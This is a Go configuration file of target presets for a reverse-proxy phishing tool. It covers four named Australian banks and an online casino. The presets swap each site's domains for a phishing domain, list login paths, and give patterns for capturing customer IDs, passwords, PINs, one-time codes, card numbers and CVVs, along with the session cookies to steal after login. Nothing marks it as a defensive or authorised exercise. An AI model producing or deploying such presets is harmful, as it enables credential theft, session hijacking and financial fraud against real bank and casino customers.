package config

import (
	"fmt"
)

// GetTargetPreset returns a target configuration preset by name
func GetTargetPreset(name string) (*TargetConfig, error) {
	presets := map[string]func() *TargetConfig{
		"westpac":          GetWestpacPreset,
		"commbank":         GetCommBankPreset,
		"anz":              GetANZPreset,
		"nab":              GetNABPreset,
		"joefortune":       GetJoeFortunePreset,
		"joefortunepokies": GetJoeFortunePreset,
	}

	presetFunc, ok := presets[name]
	if !ok {
		return nil, fmt.Errorf("unknown preset: %s", name)
	}

	return presetFunc(), nil
}

// ListPresets returns a list of available preset names
func ListPresets() []string {
	return []string{"westpac", "commbank", "anz", "nab", "joefortune"}
}

// GetAvailablePresets returns all available target presets
func GetAvailablePresets() []*TargetConfig {
	return []*TargetConfig{
		GetWestpacPreset(),
		GetCommBankPreset(),
		GetANZPreset(),
		GetNABPreset(),
		GetJoeFortunePreset(),
	}
}

// GetWestpacPreset returns Westpac Bank configuration
func GetWestpacPreset() *TargetConfig {
	return &TargetConfig{
		Name:         "westpac",
		TargetDomain: "westpac.com.au",
		Description:  "Westpac Banking Corporation",

		ExternalOrigins: []string{
			"fonts.googleapis.com",
			"fonts.gstatic.com",
			"www.googletagmanager.com",
			"www.google-analytics.com",
			"ajax.googleapis.com",
			"assets.westpac.com.au",
			"static.westpac.com.au",
			"cdn.westpac.com.au",
		},

		ContentReplacements: []ContentReplacement{
			{From: "westpac.com.au", To: "{{.PhishingDomain}}"},
			{From: "www.westpac.com.au", To: "www.{{.PhishingDomain}}"},
			{From: "online.westpac.com.au", To: "online.{{.PhishingDomain}}"},
			{From: "banking.westpac.com.au", To: "banking.{{.PhishingDomain}}"},
			{From: "api.westpac.com.au", To: "api.{{.PhishingDomain}}"},
			{From: "mobile.westpac.com.au", To: "mobile.{{.PhishingDomain}}"},
		},

		LoginPaths: []string{
			"/wbc/banking/handler",
			"/esis/Login/SrvPage",
			"/initiatesecurelogin",
			"/login",
			"/authenticate",
			"/secure/banking/administration",
		},

		CredentialPatterns: []CredentialPattern{
			{Label: "Customer ID", Start: "customer_id=", End: "&"},
			{Label: "CustomerID", Start: "customerId=", End: "&"},
			{Label: "Username", Start: "username=", End: "&"},
			{Label: "Password", Start: "password=", End: "&"},
			{Label: "PIN", Start: "pin=", End: "&"},
			{Label: "Security Code", Start: "code=", End: "&"},
			{Label: "OTP", Start: "otp=", End: "&"},
			{Label: "CustomerID_JSON", Start: `"customer_id":"`, End: `"`},
			{Label: "Password_JSON", Start: `"password":"`, End: `"`},
		},

		AuthSessionURLs: []string{
			"/wbc/banking/dashboard",
			"/account/summary",
			"/balances",
			"/accounts",
			"/secure/banking/overview",
		},

		TriggerCookies: []string{
			"session",
			"auth_token",
			"JSESSIONID",
			"WBC_SESSION",
			"access_token",
			"WBC_AUTH",
			"wbc_auth",
			"session_token",
			"CUSTOMERID",
		},
	}
}

// GetCommBankPreset returns Commonwealth Bank configuration
func GetCommBankPreset() *TargetConfig {
	return &TargetConfig{
		Name:         "commbank",
		TargetDomain: "commbank.com.au",
		Description:  "Commonwealth Bank of Australia",

		ExternalOrigins: []string{
			"fonts.googleapis.com",
			"fonts.gstatic.com",
			"www.googletagmanager.com",
			"www.google-analytics.com",
			"ajax.googleapis.com",
			"www.commbank.com.au",
			"netbank.commbank.com.au",
		},

		ContentReplacements: []ContentReplacement{
			{From: "commbank.com.au", To: "{{.PhishingDomain}}"},
			{From: "www.commbank.com.au", To: "www.{{.PhishingDomain}}"},
			{From: "netbank.commbank.com.au", To: "netbank.{{.PhishingDomain}}"},
		},

		LoginPaths: []string{
			"/netbank/logon",
			"/api/login",
			"/authenticate",
			"/logon",
		},

		CredentialPatterns: []CredentialPattern{
			{Label: "Client Number", Start: "clientNumber=", End: "&"},
			{Label: "Password", Start: "password=", End: "&"},
			{Label: "ClientNumber_JSON", Start: `"clientNumber":"`, End: `"`},
			{Label: "Password_JSON", Start: `"password":"`, End: `"`},
		},

		AuthSessionURLs: []string{
			"/netbank/home",
			"/accounts",
			"/dashboard",
		},

		TriggerCookies: []string{
			"session",
			"auth_token",
			"JSESSIONID",
			"CBA_SESSION",
		},
	}
}

// GetANZPreset returns ANZ Bank configuration
func GetANZPreset() *TargetConfig {
	return &TargetConfig{
		Name:         "anz",
		TargetDomain: "anz.com.au",
		Description:  "ANZ Bank",

		ExternalOrigins: []string{
			"fonts.googleapis.com",
			"fonts.gstatic.com",
			"www.googletagmanager.com",
			"www.google-analytics.com",
			"ajax.googleapis.com",
		},

		ContentReplacements: []ContentReplacement{
			{From: "anz.com.au", To: "{{.PhishingDomain}}"},
			{From: "www.anz.com.au", To: "www.{{.PhishingDomain}}"},
			{From: "internet.anz.com.au", To: "internet.{{.PhishingDomain}}"},
		},

		LoginPaths: []string{
			"/inetbank/login",
			"/api/login",
			"/authenticate",
		},

		CredentialPatterns: []CredentialPattern{
			{Label: "CRN", Start: "crn=", End: "&"},
			{Label: "Password", Start: "password=", End: "&"},
			{Label: "CRN_JSON", Start: `"crn":"`, End: `"`},
			{Label: "Password_JSON", Start: `"password":"`, End: `"`},
		},

		AuthSessionURLs: []string{
			"/inetbank/home",
			"/accounts",
			"/dashboard",
		},

		TriggerCookies: []string{
			"session",
			"auth_token",
			"JSESSIONID",
			"ANZ_SESSION",
		},
	}
}

// GetNABPreset returns NAB Bank configuration
func GetNABPreset() *TargetConfig {
	return &TargetConfig{
		Name:         "nab",
		TargetDomain: "nab.com.au",
		Description:  "National Australia Bank",

		ExternalOrigins: []string{
			"fonts.googleapis.com",
			"fonts.gstatic.com",
			"www.googletagmanager.com",
			"www.google-analytics.com",
			"ajax.googleapis.com",
		},

		ContentReplacements: []ContentReplacement{
			{From: "nab.com.au", To: "{{.PhishingDomain}}"},
			{From: "www.nab.com.au", To: "www.{{.PhishingDomain}}"},
			{From: "ib.nab.com.au", To: "ib.{{.PhishingDomain}}"},
		},

		LoginPaths: []string{
			"/nabib/login",
			"/api/login",
			"/authenticate",
		},

		CredentialPatterns: []CredentialPattern{
			{Label: "NAB ID", Start: "nabId=", End: "&"},
			{Label: "Password", Start: "password=", End: "&"},
			{Label: "NABID_JSON", Start: `"nabId":"`, End: `"`},
			{Label: "Password_JSON", Start: `"password":"`, End: `"`},
		},

		AuthSessionURLs: []string{
			"/nabib/home",
			"/accounts",
			"/dashboard",
		},

		TriggerCookies: []string{
			"session",
			"auth_token",
			"JSESSIONID",
			"NAB_SESSION",
		},
	}
}

// GetJoeFortunePreset returns JoeFortune Pokies configuration
func GetJoeFortunePreset() *TargetConfig {
	return &TargetConfig{
		Name:         "joefortune",
		TargetDomain: "joefortunepokies.win",
		Description:  "JoeFortune Pokies Online Casino",

		ExternalOrigins: []string{
			"fonts.googleapis.com",
			"fonts.gstatic.com",
			"www.googletagmanager.com",
			"www.google-analytics.com",
			"ajax.googleapis.com",
			"cdnjs.cloudflare.com",
			"cdn.jsdelivr.net",
			"static.joefortunepokies.win",
			"assets.joefortunepokies.win",
		},

		ContentReplacements: []ContentReplacement{
			{From: "joefortunepokies.win", To: "{{.PhishingDomain}}"},
			{From: "www.joefortunepokies.win", To: "www.{{.PhishingDomain}}"},
			{From: "play.joefortunepokies.win", To: "play.{{.PhishingDomain}}"},
			{From: "casino.joefortunepokies.win", To: "casino.{{.PhishingDomain}}"},
			{From: "api.joefortunepokies.win", To: "api.{{.PhishingDomain}}"},
			{From: "mobile.joefortunepokies.win", To: "mobile.{{.PhishingDomain}}"},
			{From: "vip.joefortunepokies.win", To: "vip.{{.PhishingDomain}}"},
		},

		LoginPaths: []string{
			"/login",
			"/signin",
			"/auth/login",
			"/api/auth/login",
			"/user/login",
			"/account/login",
			"/vip/login",
			"/casino/login",
		},

		CredentialPatterns: []CredentialPattern{
			{Label: "Username", Start: "username=", End: "&"},
			{Label: "Email", Start: "email=", End: "&"},
			{Label: "Password", Start: "password=", End: "&"},
			{Label: "Player ID", Start: "playerId=", End: "&"},
			{Label: "Account Number", Start: "accountNumber=", End: "&"},
			{Label: "Username_JSON", Start: `\"username\":\"`, End: `\"`},
			{Label: "Email_JSON", Start: `\"email\":\"`, End: `\"`},
			{Label: "Password_JSON", Start: `\"password\":\"`, End: `\"`},
			{Label: "PlayerID_JSON", Start: `\"playerId\":\"`, End: `\"`},
			{Label: "AccountNumber_JSON", Start: `\"accountNumber\":\"`, End: `\"`},
			{Label: "CreditCard", Start: "cardNumber=", End: "&"},
			{Label: "CVV", Start: "cvv=", End: "&"},
			{Label: "CardNumber_JSON", Start: `\"cardNumber\":\"`, End: `\"`},
			{Label: "CVV_JSON", Start: `\"cvv\":\"`, End: `\"`},
		},

		AuthSessionURLs: []string{
			"/dashboard",
			"/account",
			"/account/profile",
			"/account/balance",
			"/casino/lobby",
			"/vip/dashboard",
			"/play",
			"/games",
			"/deposit",
			"/withdraw",
		},

		TriggerCookies: []string{
			"session",
			"auth_token",
			"JSESSIONID",
			"player_session",
			"casino_session",
			"user_token",
			"access_token",
			"refresh_token",
			"player_id",
			"account_token",
			"vip_session",
			"game_session",
		},
	}
}
